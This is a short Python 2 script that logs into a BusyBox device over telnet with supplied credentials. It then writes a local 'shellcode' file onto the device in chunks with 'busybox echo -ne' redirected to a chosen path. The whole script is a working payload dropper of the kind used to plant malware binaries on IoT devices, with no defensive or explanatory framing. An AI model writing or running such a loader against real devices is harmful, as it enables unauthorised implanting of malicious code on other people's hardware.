#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import sys
import telnetlib
import time

def magic_wait(hlr, wait_for_strings, write_what_after, timeout, log="nothing"):
    print "waiting for "+log
    login_prompt = hlr.expect(wait_for_strings, timeout)
    if login_prompt[0] == -1:
        hlr.close()
        return False
    print "got "+log
    hlr.write(write_what_after+"\n")
    return True

def try_telnet_send(host, port, username, password, shellcode, location, timeout, chunk_reached=0):
    try:
        hlr = telnetlib.Telnet(host, port, timeout)
    except Exception, e:
        print "couldn't even connect"
        return False
    try:
        login_response = ""
        if not magic_wait(hlr, [r'USERCODE',r'usercode',r'login',r'Login', r'LOGIN'], username, timeout, "login"):
            return False
        if not magic_wait(hlr, [r'password',r'Password',r'PASSWORD'], password, timeout, 'password'):
            return False
        if not magic_wait(hlr, [r'BusyBox',r'busybox', 'Busybox', 'BUSYBOX'], '', timeout, 'busybox'):
            return False
        if not magic_wait(hlr, [r'\$',r'#', '> $'], '', timeout, 'prompt'):
            return False
        print "writing bin"
        content = open(shellcode).read().rstrip()
        chunk_size = 600
        delay = 1
        for a in xrange(chunk_reached, len(content), chunk_size):
            print "sent split"
            print str(a)+"/"+str(len(content))
            #try:
            if not magic_wait(hlr, [r'\$',r'#', '> $'], '', timeout, 'prompt'):
                return False
            #command = 'busybox echo \'echo -ne "'+content[a:a+chunk_size]+'"\' >> '+ location +'\n'
            command = 'busybox echo -ne "'+content[a:a+chunk_size]+'" >> '+ location +'\n'
            hlr.write(command)
            time.sleep(delay)
            chunk_reached = a
            #except Exception as e:
            #    try_telnet_send(host, port, username, password, shellcode, location, timeout, chunk_reached)
            #    return

        print "wrote hex"
        hlr.close()
        return True
    except Exception, e:
        hlr.close()
        print e
        return False


try:
    try_telnet_send(sys.argv[1], 23, sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], 10)
except Exception as e:
    print e
    print " try_telnet_send(host, username, password, shellcode, location)"

